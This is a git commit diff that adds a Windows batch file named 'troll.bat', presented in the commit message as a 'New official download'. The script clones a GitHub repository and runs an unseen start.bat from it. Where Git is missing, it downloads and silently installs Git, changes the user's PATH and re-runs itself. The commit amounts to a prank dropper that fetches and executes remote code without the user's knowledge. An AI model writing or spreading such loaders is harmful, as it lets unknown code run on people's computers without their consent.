4bc2f679a9eda9b138fc845e65b8a16916ce72eb
TVremote1252 <93890773+TVremote1252@users.noreply.github.com>
2025-02-02 17:41:50 -0800

    New official download

---
+++ skibidi/rizz/files/troll.bat
@@ -0,0 +1,17 @@
+@echo off
+IF EXIST "troll.bat.files"(
+    delet.bat
+    rmdir troll.bat.files
+) ELSE (IF EXIST "C:\Program Files\Git\" (
+git clone https://github.com/TVremote1252/troll.bat.git
+cd troll.bat\
+start.bat
+
+) ELSE (
+    curl -o git-installer.exe https://github.com/git-for-windows/git/releases/download/v2.47.1.windows.2/Git-2.47.1.2-64-bit.exe
+    git-installer.exe /SILENT
+    setx PATH "%PATH%;C:\Program Files\Git\Bin"
+    troll.bat
+))
+
+
